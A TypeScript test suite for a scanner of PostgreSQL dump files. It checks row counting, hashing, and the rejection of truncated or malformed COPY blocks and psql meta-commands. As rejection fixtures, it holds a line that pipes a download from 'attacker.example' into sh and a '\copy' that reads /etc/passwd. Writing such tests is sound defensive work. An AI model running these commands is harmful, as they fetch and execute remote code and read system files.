import { createHash } from 'node:crypto'
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, describe, expect, it } from 'vitest'
import { scanDump } from './dump'
import { PUBLIC_DUMP, PUBLIC_ROWS } from './test-support'

const dir = mkdtempSync(join(tmpdir(), 'backup-dump-test-'))
afterAll(() => rmSync(dir, { recursive: true, force: true }))

let fileCount = 0
function dumpFile(text: string): string {
  const path = join(dir, `dump-${++fileCount}.sql`)
  writeFileSync(path, text)
  return path
}

describe('scanDump', () => {
  it('counts the rows of every COPY block, empty blocks included', async () => {
    const scan = await scanDump(dumpFile(PUBLIC_DUMP))
    expect(scan.rows).toEqual(PUBLIC_ROWS)
  })

  it('returns the SHA-256 and size of the file’s bytes', async () => {
    const scan = await scanDump(dumpFile(PUBLIC_DUMP))
    expect(scan.sha256).toBe(createHash('sha256').update(PUBLIC_DUMP).digest('hex'))
    expect(scan.bytes).toBe(Buffer.byteLength(PUBLIC_DUMP))
  })

  it('reads a dump larger than one stream chunk, with a multi-byte character across chunks', async () => {
    const rows = Array.from({ length: 30_000 }, (_, index) => `${index}\tHọc Đều ${'ư'.repeat(7)}`)
    const text = ['COPY public.events (id, note) FROM stdin;', ...rows, '\\.', ''].join('\n')
    const scan = await scanDump(dumpFile(text))
    expect(scan.rows).toEqual({ 'public.events': 30_000 })
    expect(scan.sha256).toBe(createHash('sha256').update(text).digest('hex'))
  })

  it('reads auth tables', async () => {
    const text = [
      'COPY auth.users (id) FROM stdin;',
      'a',
      '\\.',
      'COPY auth.identities (id) FROM stdin;',
      '\\.',
      '',
    ].join('\n')
    expect((await scanDump(dumpFile(text))).rows).toEqual({ 'auth.users': 1, 'auth.identities': 0 })
  })

  it('rejects any psql meta-command but the \\restrict pair outside COPY data, without echoing it', async () => {
    // PUBLIC_DUMP ends with a newline, so the appended command is its last line.
    const lineNumber = PUBLIC_DUMP.split('\n').length
    const path = dumpFile(`${PUBLIC_DUMP}\\! curl https://attacker.example/x | sh\n`)
    const error = await scanDump(path).then(
      () => null,
      (caught: unknown) => String(caught),
    )
    expect(error).toMatch(new RegExp(`line ${lineNumber}\\b`))
    expect(error).toMatch(/meta-command/)
    expect(error).not.toContain('attacker')
  })

  it.each([
    ['\\restrict with no key', '\\restrict\n'],
    ['\\connect', '\\connect other\n'],
    ['\\copy', "\\copy public.profiles from '/etc/passwd'\n"],
  ])('rejects %s', async (_label, line) => {
    await expect(scanDump(dumpFile(`${PUBLIC_DUMP}${line}`))).rejects.toThrow(/meta-command/)
  })

  it('rejects a COPY block that never ends (a truncated dump)', async () => {
    const text = ['COPY public.events (id) FROM stdin;', '1', '2', ''].join('\n')
    await expect(scanDump(dumpFile(text))).rejects.toThrow(/public\.events.*never ends/)
  })

  it('rejects a table copied twice', async () => {
    const block = ['COPY public.events (id) FROM stdin;', '1', '\\.', ''].join('\n')
    await expect(scanDump(dumpFile(block + block))).rejects.toThrow(/public\.events.*twice/)
  })

  it.each([
    ['a quoted identifier', 'COPY public."Events" (id) FROM stdin;'],
    ['a table without a schema', 'COPY events (id) FROM stdin;'],
    ['COPY from a file', "COPY public.events (id) FROM '/tmp/x';"],
  ])('rejects a COPY statement it does not recognise: %s', async (_label, line) => {
    await expect(scanDump(dumpFile(`${line}\n\\.\n`))).rejects.toThrow(/line 1.*COPY/)
  })

  it('rejects a missing file', async () => {
    await expect(scanDump(join(dir, 'missing.sql'))).rejects.toThrow()
  })
})
